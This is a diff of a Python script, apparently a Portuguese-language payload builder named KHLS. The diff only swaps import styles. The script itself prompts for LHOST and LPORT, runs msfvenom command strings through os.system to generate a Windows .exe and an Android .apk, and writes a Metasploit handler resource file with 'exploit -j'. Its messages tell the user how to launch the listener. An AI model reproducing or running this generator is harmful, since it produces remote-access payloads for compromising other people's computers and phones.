@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import os
-import subprocess
+from os import system
+from subprocess import call
 
 def Payload_Msfvenon():
-    os.system('\033[36m')
-    os.system('clear')
-    os.system('figlet .. GR - PAYLOAD')
+    system('\033[36m')
+    system('clear')
+    system('figlet .. GR - PAYLOAD')
     a1 = "1"
     a2 = "2"
     a3 = ""
@@ -20,8 +20,8 @@ def Payload_Msfvenon():
     r = "N"
 
     while r == "N":
-        #subprocess.call("linux_logo")
-        #os.system("{}".format(i))
+        #call("linux_logo")
+        #system("{}".format(i))
         print("\033[0;0m\033[33m**************************** Autor LAUDIER-ST *************************")
         print("--------------------------   Versao KHLS 1.0  -------------------------\033[0;0m")
         print("#######################################################################")
@@ -47,15 +47,15 @@ def Payload_Msfvenon():
             o2 = ">> msfconsole-r.rc && echo set LPORT "
             o3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"
 
-            #os.system("{}".format(i3))
+            #system("{}".format(i3))
             a4 = input("\033[34m"+"\033[1m"+"LHOST: ")
             a5 = input("LPORT: ")
             a6 = m + a4 + p + a5 + e
             o4 = o1 + a4 + o2 + a5 + o3
-            os.system("{}".format(a6))
-            os.system("{}".format(o4))
-            #os.system("{}".format(i4))
-            subprocess.call("clear")
+            system("{}".format(a6))
+            system("{}".format(o4))
+            #system("{}".format(i4))
+            call("clear")
             print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output1/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSEXE.exe E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
 
         elif a3 == a2:
@@ -68,13 +68,13 @@ def Payload_Msfvenon():
             a5 = input("LPORT: ")
             a6 = m2 + a4 + p2 + a5 + e2
             z4 = z1 + a4 + z2 + a5 + z3
-            os.system("{}".format(a6))
-            os.system("{}".format(z4))
-            #os.system("{}".format(i4))
-            subprocess.call("clear")
+            system("{}".format(a6))
+            system("{}".format(z4))
+            #system("{}".format(i4))
+            call("clear")
             print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output2/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSAPP.apk E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
         print("=====================================================================")
         r = input(("\nQUER SAIR DO PROGRAMA? SE SIM (S) SE NÃO (N) ######[S/N]: ")).upper()
         print("=====================================================================")
         #os.system("{}".format(i2))
-        subprocess.call("clear")
+        call("clear")
